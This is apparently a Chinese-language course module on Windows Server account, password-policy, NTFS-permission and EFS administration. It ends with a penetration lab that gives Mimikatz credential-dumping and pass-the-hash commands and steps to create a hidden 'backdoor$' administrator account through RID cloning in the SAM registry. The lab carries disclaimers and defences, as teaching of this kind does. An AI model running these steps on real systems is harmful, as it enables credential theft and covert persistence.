# 02.项目二 Windows服务器用户管理

🎯

**学习目标**

完成本项目后，学生应能够：

1. 掌握使用 `net user` 和 PowerShell Cmdlet 对 Windows Server 本地账户进行创建、修改、禁用与删除操作
2. 理解密码策略与账户锁定策略的配置方法，能独立完成系统认证安全加固
3. 熟练使用 PowerShell 和 icacls 对文件/文件夹进行 NTFS 权限设置，掌握 EFS 加密文件系统的基本操作
4. 了解 Mimikatz 凭据提取、注册表隐藏账户、本地提权漏洞等常见攻击手法，以及对应的防御措施

---

# 任务一 Windows服务器账户管理

## 🧠 理论知识

### 用户账户分类

| 账户类型 | 说明 | 存储位置 |
| --- | --- | --- |
| 本地用户账户 | 只在本台计算机上有效 | 本地 SAM 数据库 |
| 域用户账户 | 在整个域中有效 | 域控制器 Active Directory |
| 内置账户 | 系统自带，如 Administrator、Guest | 本地 SAM 数据库 |
| 服务账户 | 用于运行服务，如 SYSTEM、Network Service | 系统内核 |

**内置账户安全说明**：

| 账户名 | 说明 | 安全建议 |
| --- | --- | --- |
| Administrator | 系统内置管理员，拥有最高权限 | 重命名并设置强密码 |
| Guest | 访客账户，权限极低 | 应禁用 |
| SYSTEM | 操作系统使用，权限高于 Administrator | 不可登录，无需修改 |
| DefaultAccount | Windows Server 2016 引入，默认禁用 | 保持禁用 |

### 账户管理核心命令

**方式一：net user 命令（CMD）**

```
# 查看所有账户
net user
# 查看指定账户详情
net user <用户名>

# 创建账户
net user <用户名> <密码> /add

# 修改密码
net user <用户名> <新密码>

# 禁用 / 启用账户
net user <用户名> /active:no
net user <用户名> /active:yes

# 删除账户
net user <用户名> /delete
```

| 参数 | 说明 | 示例 |
| --- | --- | --- |
| `/add` | 新建账户 | `net user zhangsan P@ss /add` |
| `/delete` | 删除账户 | `net user zhangsan /delete` |
| `/active:yes/no` | 启用或禁用账户 | `net user zhangsan /active:no` |
| `/fullname:"名称"` | 设置显示全名 | `/fullname:"张三"` |
| `/comment:"备注"` | 添加账户描述 | `/comment:"销售部员工"` |
| `/expires:<日期|never>` | 设置账户过期日期 |  |
| `/passwordchg:yes/no` | 是否允许用户自改密码 | `/passwordchg:no` |
| `/times:<范围|all>` | 限制登录时间段 |  |

**方式二：PowerShell 命令（推荐）**

```powershell
# 创建新用户并设置密码
$pwd = ConvertTo-SecureString "Welcome@2024" -AsPlainText -Force
New-LocalUser -Name "zhangsan" -Password $pwd -FullName "张三" -Description "销售部主管"

# 修改用户属性
Set-LocalUser -Name "zhangsan" -Description "销售部总监" -PasswordNeverExpires $false

# 启用已禁用的用户
Enable-LocalUser -Name "zhangsan"

# 禁用用户
Disable-LocalUser -Name "lisi"

# 删除用户
Remove-LocalUser -Name "wangwu"

# 查看所有本地用户
Get-LocalUser

# 查看指定用户详细信息
Get-LocalUser -Name "zhangsan" | Format-List *

# 将用户添加到管理员组
Add-LocalGroupMember -Group "Administrators" -Member "zhangsan"

# 将用户从组中移除
Remove-LocalGroupMember -Group "Administrators" -Member "zhangsan"

# 查看管理员组成员
Get-LocalGroupMember -Group "Administrators"

# 批量创建用户
$users = @("user1", "user2", "user3")
foreach ($user in $users) {
    $pwd = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
    New-LocalUser -Name $user -Password $pwd -Description "批量创建的用户"
}

# 设置用户账户过期时间（90天后）
Set-LocalUser -Name "zhangsan" -AccountExpires (Get-Date).AddDays(90)

# 重置用户密码
$newPwd = ConvertTo-SecureString "NewP@ss2024" -AsPlainText -Force
Set-LocalUser -Name "zhangsan" -Password $newPwd
```

**PowerShell 批量管理示例**

```powershell
# 从 CSV 文件批量创建用户
# CSV 文件格式：Name,FullName,Description
# zhangsan,张三,销售部
# lisi,李四,技术部

Import-Csv "C:\Users\admin\Desktop\users.csv" | ForEach-Object {
    $pwd = ConvertTo-SecureString "Welcome@2024" -AsPlainText -Force
    New-LocalUser -Name $_.Name -Password $pwd -FullName $_.FullName -Description $_.Description
    Write-Host "已创建用户:$($_.Name)" -ForegroundColor Green
}

# 批量禁用长期未使用的账户（假设超过90天未登录）
Get-LocalUser | Where-Object {
    $_.LastLogon -lt (Get-Date).AddDays(-90) -and $_.Enabled -eq $true
} | ForEach-Object {
    Disable-LocalUser -Name $_.Name
    Write-Host "已禁用用户:$($_.Name)" -ForegroundColor Yellow
}

# 导出所有用户信息到 CSV
Get-LocalUser | Select-Object Name, Enabled, Description, LastLogon |
    Export-Csv "C:\users_export.csv" -NoTypeInformation -Encoding UTF8
```

| Cmdlet | 功能 | 常用参数 |
| --- | --- | --- |
| `New-LocalUser` | 创建本地用户 | `-Name` `-Password` `-FullName` `-Description` |
| `Set-LocalUser` | 修改用户属性 | `-Name` `-Password` `-Description` `-PasswordNeverExpires` |
| `Enable-LocalUser` | 启用账户 | `-Name` |
| `Disable-LocalUser` | 禁用账户 | `-Name` |
| `Remove-LocalUser` | 删除账户 | `-Name` |
| `Get-LocalUser` | 查看用户信息 | `-Name`（可省略） |
| `Add-LocalGroupMember` | 将用户加入组 | `-Group` `-Member` |
| `Remove-LocalGroupMember` | 将用户从组中移除 | `-Group` `-Member` |
| `Get-LocalGroupMember` | 查看组成员 | `-Group` |

**密码转换说明**：PowerShell 的密码参数要求 SecureString 类型，需先转换：

```powershell
$pwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
```

| 参数 | 说明 |
| --- | --- |
| `-AsPlainText` | 声明输入为明文字符串 |
| `-Force` | 确认了解明文传递风险，强制执行（与 -AsPlainText 搭配使用） |

📌

**本节小结**

- Windows 账户分为**本地账户、域账户、内置账户、服务账户**四类；内置的 Administrator 应重命名并设置强密码，Guest 应禁用
- `net user` 适合快速操作，PowerShell 的 `-LocalUser` / `-LocalGroupMember` 系列 Cmdlet 功能更完整、更适合脚本化管理
- PowerShell 密码参数类型为 **SecureString**，需通过 `ConvertTo-SecureString` 转换后传入
- 用户加入哪个本地组决定其权限级别：`Administrators` 拥有完全控制权，`Users` 为标准使用者

---

## 💡 场景任务

🏢

**场景：公司新员工入职**

销售部新入职3名员工：张三（zhangsan）、李四（lisi）、王五（wangwu）。IT管理员需为其创建服务器账户，初始密码统一为 `Welcome@2024`。张三为部门主管，加入 Administrators 组；李四和王五加入普通 Users 组。同时，旧账户 `oldstaff` 长期未使用，需要禁用。

**第 1 步：创建三个新账户**

```
net user zhangsan Welcome@2024 /add
net user lisi Welcome@2024 /add
net user wangwu Welcome@2024 /add
```

**第 2 步：将账户加入对应用户组**

```powershell
# 张三加入管理员组
Add-LocalGroupMember -Group "Administrators" -Member "zhangsan"

# 李四、王五加入普通用户组
Add-LocalGroupMember -Group "Users" -Member "lisi"
Add-LocalGroupMember -Group "Users" -Member "wangwu"
```

**第 3 步：为张三设置职位描述**

```powershell
Set-LocalUser -Name "zhangsan" -Description "销售部主管"
```

**第 4 步：禁用旧账户 oldstaff**

```powershell
Disable-LocalUser -Name "oldstaff"
```

**第 5 步：验证操作结果（截图保留）**

```powershell
# 查看所有账户的名称、状态和描述
Get-LocalUser | Select-Object Name, Enabled, Description

# 确认张三已加入 Administrators 组
Get-LocalGroupMember -Group "Administrators"

# 确认 oldstaff 已被禁用
Get-LocalUser -Name "oldstaff" | Select-Object Name, Enabled
```

---

## 📋 命令参数参考

**New-LocalUser 参数详解**

| 参数 | 说明 | 示例值 |
| --- | --- | --- |
| `-Name` | 登录名，必填 | `"zhangsan"` |
| `-Password` | 密码，须为 SecureString 类型 | `(ConvertTo-SecureString "P@ss" -AsPlainText -Force)` |
| `-FullName` | 用户全名（显示名称） | `"张三"` |
| `-Description` | 账户描述备注 | `"销售部员工"` |
| `-AccountNeverExpires` | 账户永不过期（开关参数） | 直接加参数名即生效 |
| `-PasswordNeverExpires` | 密码永不过期 | `$true` 或 `$false` |
| `-Disabled` | 创建时直接禁用账户（开关参数） | 直接加参数名即生效 |

**Set-LocalUser 参数详解**

| 参数 | 说明 | 示例值 |
| --- | --- | --- |
| `-Name` | 目标用户名，必填 | `"zhangsan"` |
| `-Password` | 重置密码，须为 SecureString | `(ConvertTo-SecureString "NewP@ss" -AsPlainText -Force)` |
| `-Description` | 修改账户描述 | `"销售部主管"` |
| `-PasswordNeverExpires` | 设置密码是否永不过期 | `$true` / `$false` |
| `-AccountExpires` | 设置账户到期时间 | `(Get-Date).AddDays(90)` |

**reg add 参数详解**（用于修改注册表）

```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f
```

| 参数 | 说明 | 常用值 |
| --- | --- | --- |
| `/v` | 键值名称（Value Name） | `AutoAdminLogon` |
| `/t` | 数据类型 | `REG_SZ`（字符串）、`REG_DWORD`（整数） |
| `/d` | 要写入的数据 | `"0"` |
| `/f` | 强制覆盖，不提示确认 | — |

---

# 任务二 Windows服务器密码管理

## 🧠 理论知识

### 身份验证方法

| 认证方式 | 说明 | 安全性 |
| --- | --- | --- |
| LM Hash | 早期 Windows 使用，已被禁用 | 极低，已废弃 |
| NTLM | 目前仍在局域网中广泛使用 | 中等 |
| Kerberos | 域环境标准认证协议 | 高 |
| Windows Hello / 生物识别 | 指纹、人脸识别等现代方式 | 很高 |

### LM Hash（LAN Manager Hash）

**原理：** LM Hash 是 Windows 最早期的密码加密方式，出现在 Windows NT 之前的系统中。它将密码转换为大写字母，然后分成两个7字符的块分别进行 DES 加密。

**安全问题：**

- 密码不区分大小写，降低了密码空间
- 最多只支持14个字符，超出部分被截断
- 密码被分成两个7字符块独立加密，可以分别破解
- 没有使用盐值（salt），相同密码产生相同哈希
- 可以在几秒内通过彩虹表（Rainbow Table）破解

**当前状态：** 从 Windows Vista / Server 2008 开始，LM Hash 已默认禁用。现代 Windows 系统不再生成或存储 LM Hash。

### NTLM（NT LAN Manager）

**原理：** NTLM 是对 LM Hash 的改进，使用 MD4 算法对密码的 Unicode 编码进行哈希。它保留了密码的大小写敏感性，支持更长的密码。

**工作流程（挑战/响应机制）：**

1. 客户端向服务器发送身份验证请求
2. 服务器返回一个随机数（Challenge）
3. 客户端使用密码哈希加密 Challenge，发送响应（Response）
4. 服务器验证响应是否正确

**版本演进：**

- **NTLMv1：** 存在严重安全漏洞，容易被中间人攻击和重放攻击
- **NTLMv2：** 增强版本，加入了时间戳和客户端 Challenge，提高了安全性

**应用场景：**

- 工作组环境（非域环境）中的默认认证方式
- 域环境中作为 Kerberos 的后备认证方式
- 通过 IP 地址访问资源时（无法使用 Kerberos）

**安全问题：**

- 易受 Pass-the-Hash 攻击（攻击者无需知道明文密码，只需获取哈希值即可认证）
- 不支持双向认证（只验证客户端，不验证服务器）
- 容易被中继攻击（NTLM Relay）利用

### Kerberos

**原理：** Kerberos 是一种基于票据（Ticket）的网络认证协议,使用对称密钥加密技术。它由麻省理工学院（MIT）开发，Windows 2000 开始成为域环境的默认认证协议。

**核心组件：**

- **KDC（Key Distribution Center）：** 密钥分发中心，运行在域控制器上
- **AS（Authentication Service）：** 认证服务，验证用户身份
- **TGS（Ticket Granting Service）：** 票据授予服务，颁发服务票据

**认证流程：**

1. 用户输入密码后，客户端向 AS 发送认证请求
2. AS 验证用户身份，返回 TGT（Ticket Granting Ticket）
3. 客户端使用 TGT 向 TGS 请求访问特定服务的票据
4. TGS 验证 TGT，返回服务票据（Service Ticket）
5. 客户端使用服务票据访问目标服务
6. 服务器验证票据，允许访问

**安全优势：**

- **双向认证：** 客户端和服务器互相验证身份
- **票据有时效性：** 默认 TGT 有效期为10小时，服务票据有效期更短
- **密码不在网络传输：** 只传输加密的票据
- **单点登录（SSO）：** 一次认证，多次访问不同服务

**常见攻击：**

- **黄金票据（Golden Ticket）：** 攻击者获取 krbtgt 账户的哈希值后，可伪造任意用户的 TGT
- **白银票据（Silver Ticket）：** 伪造特定服务的服务票据
- **Kerberoasting：** 请求服务票据后离线暴力破解服务账户密码

### Windows Hello / 生物识别

### 密码策略与账户锁定策略

**原理：** Windows Hello 是 Windows 10 引入的现代身份验证系统，支持人脸识别、指纹识别和 PIN 码登录，无需传统密码。

**技术特点：**

- **本地生物特征存储：** 生物特征数据存储在设备本地的 TPM（可信平台模块）芯片中，不上传到云端
- **多因素认证：** 结合”你拥有的设备”和”你是谁”两个因素
- **防欺骗技术：** 人脸识别使用红外摄像头和 3D 深度传感器，防止照片欺骗

**支持的认证方式：**

- **Windows Hello 人脸识别：** 需要支持红外的专用摄像头（如 Intel RealSense）
- **Windows Hello 指纹识别：** 需要指纹读取器
- **Windows Hello PIN：** 设备专用的 PIN 码，比传统密码更安全（绑定设备，无法远程使用）

**企业级功能：**

- **Windows Hello for Business：** 企业版，支持证书或密钥信任模式，与 Azure AD 或本地 AD 集成
- **无密码登录：** 完全取代传统密码，提高用户体验和安全性

**安全优势：**

- 抗钓鱼攻击（无密码可窃取）
- 防止暴力破解（生物特征难以复制）
- 设备绑定（PIN 和生物特征只在注册设备上有效）
- 结合 TPM 硬件保护，密钥材料无法导出

配置路径：运行 `secpol.msc` → 账户策略

**密码策略**（→ 密码策略）：

| 策略名称 | 建议值 | 说明 |
| --- | --- | --- |
| 密码必须符合复杂性要求 | 启用 | 要求包含大小写字母、数字、特殊符号 |
| 最短密码长度 | 12 个字符 | 长度越长越难破解 |
| 密码最长使用期限 | 90 天 | 到期后强制修改 |
| 密码最短使用期限 | 1 天 | 防止用户立即改回旧密码 |
| 强制密码历史 | 5 个 | 记录历史密码，防止重复使用 |

**账户锁定策略**（→ 账户锁定策略）：

| 策略名称 | 建议值 | 说明 |
| --- | --- | --- |
| 账户锁定阈值 | 5 次 | 连续错误 N 次后锁定账户 |
| 账户锁定时间 | 15 分钟 | 锁定后自动解锁等待时间 |
| 复位账户锁定计数器 | 15 分钟 | 错误计数归零的等待时间 |

> 💡 **现代最佳实践**：微软建议不强制定期换密码，改用**长密码短语 + 多因素认证（MFA）** ，如 “我爱北京天安门2024!” 比复杂的8位密码更安全。
> 

📌

**本节小结**

- Windows 身份验证协议经历了 LM Hash → NTLM → Kerberos 的演进，域环境推荐 Kerberos，现代终端推荐 Windows Hello
- 密码策略通过 `secpol.msc` 配置，关键参数：**复杂性要求启用、最短12位、历史记录5个**
- 账户锁定策略建议：**5次失败后锁定、锁定时间15分钟**，有效抵御暴力破解
- 策略修改后需执行 `gpupdate /force` 立即生效，用 `net accounts` 验证当前配置

---

## 💡 场景任务

🔐

**场景：公司安全审计整改**

IT安全团队季度审计发现三个问题：①部分账户密码仅6位且无复杂性要求；②登录失败无锁定机制，存在暴力破解风险；③Administrator 账户仍使用默认名称。要求运维人员统一加固密码策略，并为 Administrator 重置强密码。

**第 1 步：打开本地安全策略，配置密码策略**

```
secpol.msc
```

进入 **账户策略 → 密码策略**，逐项双击设置：

```
密码必须符合复杂性要求  →  启用
最短密码长度            →  12 个字符
密码最长使用期限        →  90 天
强制密码历史            →  5 个
```

**第 2 步：配置账户锁定策略**

进入 **账户策略 → 账户锁定策略**，逐项双击设置：

```
账户锁定阈值       →  5 次
账户锁定时间       →  15 分钟
复位账户锁定计数器  →  15 分钟
```

**第 3 步：为 Administrator 重置强密码**

```
# 方式一：CMD 命令行
net user Administrator Admin@Server2024

# 方式二：PowerShell（推荐）
$pwd = ConvertTo-SecureString "Admin@Server2024" -AsPlainText -Force
Set-LocalUser -Name "Administrator" -Password $pwd
```

**第 4 步：强制刷新策略，使其立即生效**

```
gpupdate /force
```

**第 5 步：验证策略已生效（截图保留）**

```
# 查看当前密码策略配置
net accounts
```

---

## 📋 命令参数参考

**gpupdate 参数详解**

| 参数 | 说明 | 示例 |
| --- | --- | --- |
| `/force` | 强制重新应用所有策略（含未变更项） | `gpupdate /force` |
| `/target:computer` | 仅更新计算机配置策略 | `gpupdate /target:computer` |
| `/target:user` | 仅更新用户配置策略 | `gpupdate /target:user` |
| `/logoff` | 更新后自动注销（部分用户策略需注销生效） | `gpupdate /force /logoff` |
| `/boot` | 更新后自动重启（部分计算机策略需重启生效） | `gpupdate /force /boot` |

**net accounts 输出字段说明**

| 字段 | 含义 |
| --- | --- |
| Minimum password length | 最短密码长度 |
| Maximum password age | 密码最长使用天数 |
| Lockout threshold | 锁定阈值（错误次数） |
| Lockout duration | 锁定持续时间（分钟） |

---

# 任务三 Windows服务器授权管理

## 🧠 理论知识

### Windows 权限体系

| 权限类型 | 作用范围 | 说明 |
| --- | --- | --- |
| 共享权限（Share Permissions） | 仅限网络访问 | 控制通过网络访问共享资源的权限 |
| NTFS 权限（NTFS Permissions） | 本地 + 网络访问 | 控制文件/文件夹的精细访问权限 |

> ⚠️ **叠加原则**：共享权限和 NTFS 权限同时存在时，用户实际权限取**两者中更严格的一个**。
> 

### NTFS 权限级别

| 权限级别 | 包含操作 |
| --- | --- |
| 完全控制 | 读取、写入、修改、删除、更改权限、取得所有权 |
| 修改 | 读取、写入、修改、删除（不含更改权限） |
| 读取和执行 | 查看文件内容、运行程序 |
| 列出文件夹内容 | 查看文件夹中的文件列表（仅文件夹） |
| 读取 | 查看文件属性和内容 |
| 写入 | 创建新文件/文件夹、修改文件内容 |

**权限叠加规则**：同一用户属于多个组时权限取**并集（最宽松）** ，但「拒绝」权限优先于「允许」权限。

### EFS 加密文件系统

EFS 是 NTFS 提供的文件级透明加密功能，加密与用户账户绑定：

| 操作 | 说明 |
| --- | --- |
| 加密 | 用 FEK（文件加密密钥）加密文件，再用用户公钥加密 FEK |
| 解密 | 用用户私钥解密 FEK，再用 FEK 解密文件，用户透明访问 |
| 注意 | 重装系统或删除账户后，若未备份证书，文件将**永久无法解密** |
| 备份 | 通过 `certmgr.msc` 导出 EFS 证书（.pfx 文件）到安全位置 |

📌

**本节小结**

- Windows 文件权限分为**共享权限**（仅网络访问）和 **NTFS 权限**（本地+网络），实际生效取两者中**更严格**的一方
- NTFS 权限级别由高到低：完全控制 → 修改 → 读取和执行 → 读取 → 写入；多组权限叠加取**并集**，但”拒绝”优先
- 通过 PowerShell 的 `Get-Acl` / `Set-Acl` 或 `icacls` 命令可精细管理访问控制列表（ACL）
- EFS 加密与**用户账户绑定**，务必通过 `certmgr.msc` 备份 .pfx 证书，否则重装系统后文件将永久无法解密

---

## 💡 场景任务

📁

**场景：部门文件夹权限分级管理**

服务器共享目录 `C:\CompanyData` 下有三个子文件夹，需按以下规则设置权限：

- `Sales`（销售资料）：销售组 `SalesGroup` 拥有**读取和执行**权限
- `Finance`（财务数据）：财务账户 `finance_user` 拥有**修改**权限
- `Public`（公共文档）：所有员工 `Users` 拥有**读取和执行**权限
- `Finance` 文件夹中的薪资文件需启用 **EFS 加密**保护

**第 1 步：创建目录结构**

```powershell
New-Item -ItemType Directory -Path "C:\CompanyData"
New-Item -ItemType Directory -Path "C:\CompanyData\Sales"
New-Item -ItemType Directory -Path "C:\CompanyData\Finance"
New-Item -ItemType Directory -Path "C:\CompanyData\Public"

# 验证目录已创建
Get-ChildItem C:\CompanyData
```

**第 2 步：为 Sales 文件夹设置 SalesGroup 的读取和执行权限**

```powershell
$acl = Get-Acl "C:\CompanyData\Sales"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "SalesGroup", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow"
)
$acl.SetAccessRule($rule)
Set-Acl "C:\CompanyData\Sales" $acl

# 验证权限
icacls C:\CompanyData\Sales
```

**第 3 步：为 Finance 文件夹设置 finance_user 的修改权限**

```powershell
$acl = Get-Acl "C:\CompanyData\Finance"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "finance_user", "Modify", "ContainerInherit,ObjectInherit", "None", "Allow"
)
$acl.SetAccessRule($rule)
Set-Acl "C:\CompanyData\Finance" $acl

# 验证权限
icacls C:\CompanyData\Finance
```

**第 4 步：创建测试文件并进行 EFS 加密**

```powershell
# 创建薪资测试文件
New-Item -ItemType File -Path "C:\CompanyData\Finance\salary.txt" -Value "员工薪资数据"

# 对文件进行 EFS 加密
cipher /e C:\CompanyData\Finance\salary.txt

# 加密后文件名在资源管理器中显示为绿色
```

**第 5 步：验证加密状态（截图保留）**

```
# 查看当前用户所有已加密文件（E=已加密，U=未加密）
cipher /u

# 查看 Finance 文件夹的加密状态
cipher C:\CompanyData\Finance
```

---

## 📋 命令参数参考

**Get-Acl / Set-Acl 说明**

| Cmdlet | 参数 | 说明 |
| --- | --- | --- |
| `Get-Acl` | `-Path` | 获取指定路径的访问控制列表（ACL） |
| `Set-Acl` | `-Path` • ACL对象 | 将修改后的 ACL 应用到指定路径 |

**FileSystemAccessRule 构造参数**

| 位置 | 含义 | 可用值 |
| --- | --- | --- |
| 第1个 | 用户或组名称 | `"SalesGroup"`、`"BUILTIN\Users"` |
| 第2个 | 权限类型（FileSystemRights） | `"ReadAndExecute"` / `"Modify"` / `"FullControl"` / `"Read"` / `"Write"` |
| 第3个 | 继承标志（InheritanceFlags） | `"ContainerInherit,ObjectInherit"`（应用至子文件夹和文件） |
| 第4个 | 传播标志（PropagationFlags） | `"None"` |
| 第5个 | 访问控制类型 | `"Allow"` 或 `"Deny"` |

**icacls 命令快速参考**

| 用法 | 说明 |
| --- | --- |
| `icacls <路径>` | 查看当前权限 |
| `icacls <路径> /grant <用户>:(OI)(CI)RX` | 授予读取和执行权限 |
| `icacls <路径> /grant <用户>:(OI)(CI)M` | 授予修改权限 |
| `icacls <路径> /grant <用户>:(OI)(CI)F` | 授予完全控制权限 |
| `icacls <路径> /remove <用户>` | 移除用户的所有权限 |

**权限代码与继承代码说明**

| 权限代码 | 含义 | 继承代码 | 含义 |
| --- | --- | --- | --- |
| `F` | 完全控制 | `(OI)` | 应用到子文件 |
| `M` | 修改 | `(CI)` | 应用到子文件夹 |
| `RX` | 读取和执行 | `(NP)` | 不继承到下级 |
| `R` | 只读 |  |  |
| `W` | 写入 |  |  |

**cipher 命令参数**

| 参数 | 说明 | 示例 |
| --- | --- | --- |
| `/e` | 加密指定文件或文件夹 | `cipher /e C:\secret.txt` |
| `/d` | 解密指定文件或文件夹 | `cipher /d C:\secret.txt` |
| `/s:<目录>` | 对目录及所有子目录操作 | `cipher /e /s:C:\SecretFolder` |
| `/u` | 列出当前用户所有已加密文件 | `cipher /u` |
| `/r:<前缀>` | 生成 EFS 恢复代理证书（备份用） | `cipher /r:EFSBackup` |

---

# 任务四 Windows用户渗透（拓展）

## 🧠 理论知识

### Mimikatz 获取系统密码

Mimikatz 是由法国安全研究员 Benjamin Delpy 开发的调试工具，可从 Windows 内存（LSASS 进程）中提取明文密码、NTLM 哈希、Kerberos 票据等凭据。

**工作原理**：Windows 将用户凭据缓存在 LSASS 进程内存中，Mimikatz 通过调用 Windows 调试 API 读取该内存区域。

**防御措施**：

| 防御手段 | 说明 |
| --- | --- |
| Windows Credential Guard | 使用虚拟化技术隔离保护凭据 |
| LSA 保护（RunAsPPL） | 将 LSASS 运行在受保护进程模式（Win10 1607+） |
| 受保护用户组 | 加入 Protected Users 组，限制凭据缓存 |
| EDR 方案 | 部署 Microsoft Defender for Endpoint 等终端检测工具 |

启用 LSA 保护命令：

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f
```

### 隐藏用户（$ 后缀账户）

攻击者在获取权限后，在用户名末尾加 `$`（如 `backdoor$`）创建隐藏账户，该账户不显示在登录界面和 `net user` 列表中，但实际存在于系统中。

**检测方法**：对比 `net user` 输出与注册表 SAM 键值，注册表多出的即为隐藏账户。

```
reg query HKLM\SAM\SAM\Domains\Account\Users\Names
wmic useraccount list full
```

📌

**本节小结**

- Mimikatz 通过调用 Windows 调试 API 读取 LSASS 进程内存，可提取明文密码和 NTLM 哈希；防御手段包括启用 **Credential Guard**、**LSA 保护（RunAsPPL）** 和部署 EDR
- 以 `$` 结尾的账户在 `net user` 和登录界面中隐藏，可通过 `wmic useraccount list full` 或直接查询注册表 SAM 键发现
- CVE-2021-1732 属于本地提权漏洞（Win32k 越界写入），修复方法是安装补丁 **KB4601319**
- 以上攻击手法应在**授权的实验环境**中学习，任何未授权使用均属违法行为

---

## 🛠️ 实践操作

### 实验一：利用 Mimikatz 获取密码

**第 1 步：以管理员权限启动 Mimikatz**

```
# 右键 mimikatz.exe → 以管理员身份运行
# 或在管理员 CMD 中执行
cd C:\Tools\mimikatz
mimikatz.exe
```

**第 2 步：在交互界面依次执行**

```
# 获取调试权限（必须先执行）
privilege::debug
# 成功输出：Privilege '20' OK

# 从 LSASS 内存中提取登录用户凭据
sekurlsa::logonpasswords
# 输出：Username（用户名）/ Password（明文）/ NTLM（哈希）

# 导出本地 SAM 数据库所有账户哈希
lsadump::sam

# 退出
exit
```

**第 3 步：Pass-the-Hash 演示（概念）**

```
# 使用获取到的 NTLM 哈希直接认证，无需明文密码
sekurlsa::pth /user:Administrator /domain:. /ntlm:<哈希值>
```

> ⚠️ **免责声明**：以上操作仅用于授权渗透测试和安全教学环境，在未授权系统上使用属于违法行为。
> 

---

### 实验二：注册表隐藏后门账户

**第 1 步：创建隐藏账户**

```
# $ 结尾账户不显示在 net user 列表和登录界面
net user backdoor$ P@ssw0rd /add
net localgroup administrators backdoor$ /add

# 验证：net user 不显示，但 wmic 可查到
net user
wmic useraccount list full | findstr backdoor
```

**第 2 步：以 SYSTEM 权限访问 SAM 注册表**

```
# 使用 PsExec 以 SYSTEM 权限运行注册表编辑器
PsExec.exe -i -s regedit
```

**第 3 步：导出注册表键**

```powershell
reg export "HKLM\SAM\SAM\Domains\Account\Users\Names\Administrator" admin.reg
reg export "HKLM\SAM\SAM\Domains\Account\Users\Names\backdoor$" backdoor.reg
# 还需导出 backdoor$ 对应的 RID 键（在 Names 键中查看类型值获取 RID）
reg export "HKLM\SAM\SAM\Domains\Account\Users\000003EA" backdoor_rid.reg
```

**第 4 步：克隆 RID，使隐藏账户获得 Administrator 权限**

```
# 编辑 backdoor_rid.reg，将 RID 替换为 Administrator 的 RID（0x1F4=500）
# 导入修改后的文件
reg import backdoor_rid_modified.reg
```

**第 5 步：检测与防御**

```powershell
# 对比两种查询，发现隐藏账户
Get-LocalUser | Select-Object Name
reg query HKLM\SAM\SAM\Domains\Account\Users\Names
# 注册表中多出的条目即为隐藏账户
```

> ⚠️ **免责声明**：以上操作仅用于授权渗透测试和安全教学环境，在未授权系统上使用属于违法行为。
> 

---

### 实验三：CVE-2021-1732 本地提权

**漏洞信息**：Windows Win32k 组件越界写入漏洞，可将普通用户提升为 SYSTEM 权限。

| 项目 | 内容 |
| --- | --- |
| 影响版本 | Windows 10 1903+、Windows Server 2016/2019 |
| CVSS 评分 | 7.8（高危） |
| 修复补丁 | KB4601319（2021年2月安全更新） |

**第 1 步：检查系统是否受影响**

```powershell
# 查看系统版本
Get-ComputerInfo | Select-Object OsName, OsBuildNumber

# 检查补丁是否已安装（无输出则未安装，存在漏洞）
Get-HotFix -Id KB4601319
```

**第 2 步：验证提权效果（实验环境）**

```
# 以普通用户身份运行 POC 后，在弹出的 SYSTEM shell 中验证
whoami
# 输出：nt authority\system  ← 提权成功
```

**第 3 步：修复与验证**

```powershell
# 安装补丁
wusa.exe KB4601319.msu /quiet /norestart

# 验证补丁已安装
Get-HotFix -Id KB4601319
# 有输出 → 已修复
```

> ⚠️ **免责声明**：以上操作仅用于授权渗透测试和安全教学环境，在未授权系统上使用属于违法行为。
> 

[项目二 教学逐字稿（约90分钟）](%E9%A1%B9%E7%9B%AE%E4%BA%8C%20Windows%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86/%E9%A1%B9%E7%9B%AE%E4%BA%8C%20%E6%95%99%E5%AD%A6%E9%80%90%E5%AD%97%E7%A8%BF%EF%BC%88%E7%BA%A690%E5%88%86%E9%92%9F%EF%BC%89%20fd62a11bdffb4b79b1433d4bd64c958a.md)